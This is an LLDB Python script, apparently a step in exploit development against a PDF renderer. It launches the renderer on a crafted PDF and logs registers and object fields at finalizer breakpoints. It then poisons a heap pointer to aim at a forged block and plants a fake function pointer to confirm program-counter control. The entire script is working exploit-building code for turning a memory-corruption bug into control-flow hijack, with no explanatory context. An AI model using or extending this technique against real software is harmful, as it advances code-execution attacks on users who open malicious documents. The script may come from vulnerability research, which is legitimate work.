# RIP-22: finalize-object recon + poison-block consumption check.
# A: OneShot entry bp; finalize bp from start; at each finalize hit dump x0 obj,
#    x8 src offset, x30 caller, and which obj ptr-fields point into the pool.
# B: poison@walk-hit2 -> blk; finalize hits: x0 or INNER ptrs in blk? dump blk.
# C: if x8 chain routes into blk -> plant fake fn-ptr -> PC check.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
TRACE = open(os.path.join(CWD, "rip22_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()
FAKEPTR = 0x515100000000

def qwords(p, addr, n):
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

def wr(p, addr, data):
    p.WriteMemory(addr, data, err)
    return err.Success()

def fresh():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.2)

def wait_stop(p, budget=25):
    p.Continue()
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.5); st = p.GetState()
            except Exception: pass
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.1); st = p.GetState()
    return st

def killp(p):
    try:
        if p and p.IsValid() and p.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
            p.Kill()
    except Exception: pass

def frame_name(fr):
    try: return fr.GetSymbol().GetName() or "?"
    except Exception: return "?"

def pc_off(fr):
    try:
        if fr.GetSymbol():
            return fr.GetPCAddress().GetLoadAddress(t) - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
    except Exception: pass
    return -1

def run(mode, blk_hook=None):
    """mode 'A': pure recon. mode 'B': poison at walk-hit2."""
    fresh()
    be = t.BreakpointCreateByName("aa_cache_render")
    be.SetOneShot(True)   # auto-pop after first hit — the lesson
    bf = t.BreakpointCreateByName("data_release_info")
    p = t.LaunchSimple(["k2_d31472.pdf", "r.png"], None, CWD)
    if not p or not p.IsValid():
        T("%s launchfail" % mode); return
    x19 = x27 = 0
    walkhits = 0
    finhits = 0
    blk = 0
    poisoned = False
    for i in range(400):
        st = wait_stop(p)
        if st != lldb.eStateStopped:
            T("%s decode ended (st=%s rc=%s)" % (mode, st, p.GetExitStatus() if p.IsValid() else -1))
            break
        fr = p.GetSelectedThread().GetSelectedFrame()
        nm = frame_name(fr)
        off = pc_off(fr)
        if "data_release_info" in nm:
            finhits += 1
            x0 = fr.FindRegister("x0").GetValueAsUnsigned()
            x8 = 0
            r8 = fr.FindRegister("x8")
            if r8 and r8.IsValid(): x8 = r8.GetValueAsUnsigned()
            x30 = fr.FindRegister("x30").GetValueAsUnsigned()
            T("%s FIN#%d x0=%x x8=%x lr=%x off=%d" % (mode, finhits, x0, x8, x30, off))
            obj = qwords(p, x0, 0x130//8)
            if obj:
                T("%s obj: %s" % (mode, [hex(q) for q in obj]))
                src = [j*8 for j, q in enumerate(obj) if q == x8]
                T("%s x8-src-offsets=%s" % (mode, src))
                poolrefs = [(j*8, hex(q)) for j, q in enumerate(obj)
                            if x19 and x19 - 0x4000 <= q <= x19 + 0x4000]
                T("%s obj-ptr-fields-in-POOL: %s" % (mode, poolrefs))
                blkrefs = [(j*8, hex(q)) for j, q in enumerate(obj)
                           if blk and blk <= q < blk + 0x1000]
                T("%s obj-ptr-fields-in-BLK: %s" % (mode, blkrefs))
                # C: if x8 loaded from obj field whose VALUE points into blk body? or obj in blk?
                if blk and blk <= x0 < blk + 0x1000 and src:
                    wr(p, x0 + src[0], struct.pack('<Q', FAKEPTR))
                    T("%s fake fn-ptr @x0+%x" % (mode, src[0]))
                    st2 = wait_stop(p)
                    if st2 == lldb.eStateStopped:
                        fr2 = p.GetSelectedThread().GetSelectedFrame()
                        pc2 = fr2.GetPCAddress().GetLoadAddress(t)
                        T("%s PC=%x (fake=%x) %s" % (mode, pc2, FAKEPTR,
                            "🎯 PC-CONTROL" if (pc2 >> 20) == (FAKEPTR >> 20) else (p.GetSelectedThread().GetStopDescription(200) or "")[:80]))
                    killp(p); break
            if blk:
                body = p.ReadMemory(blk + 0x100, 0x40, err)
                if err.Success() and body:
                    nz = sum(1 for b in body if b)
                    T("%s blk-body@fin: nonzero=%d/64 first16=%s" % (mode, nz, body[:16].hex()))
            p.Continue()  # next
        elif "aa_cache_render" in nm:
            xv19 = fr.FindRegister("x19").GetValueAsUnsigned()
            xv27 = fr.FindRegister("x27").GetValueAsUnsigned()
            if off == 1804:
                walkhits += 1
                x19, x27 = xv19, xv27
                if mode == "B" and walkhits == 2 and not poisoned and x19:
                    qs = qwords(p, x19, 16)
                    orig = qs[7] if qs else 0
                    blk = (x27 - 0x4800) + 0x100
                    if 0x100000000 <= orig < 0x800000000000:
                        hdr = p.ReadMemory(orig, 0x100, err)
                        if err.Success() and hdr: wr(p, blk, hdr)
                    wr(p, x19 + 0x38, struct.pack('<Q', blk))
                    poisoned = True
                    T("%s POISON walk#2 x19+0x38 (%x) -> blk=%x" % (mode, orig, blk))
            p.Continue()
        else:
            T("%s stray @%s+%d" % (mode, nm[:50], off))
            p.Continue()
        if i > 380: T("%s loop cap" % mode); break
    killp(p)
    for b in (be, bf):
        if b: t.BreakpointDelete(b.GetID())

run("A")
run("B")
T("RIP-22 DONE")
TRACE.close()
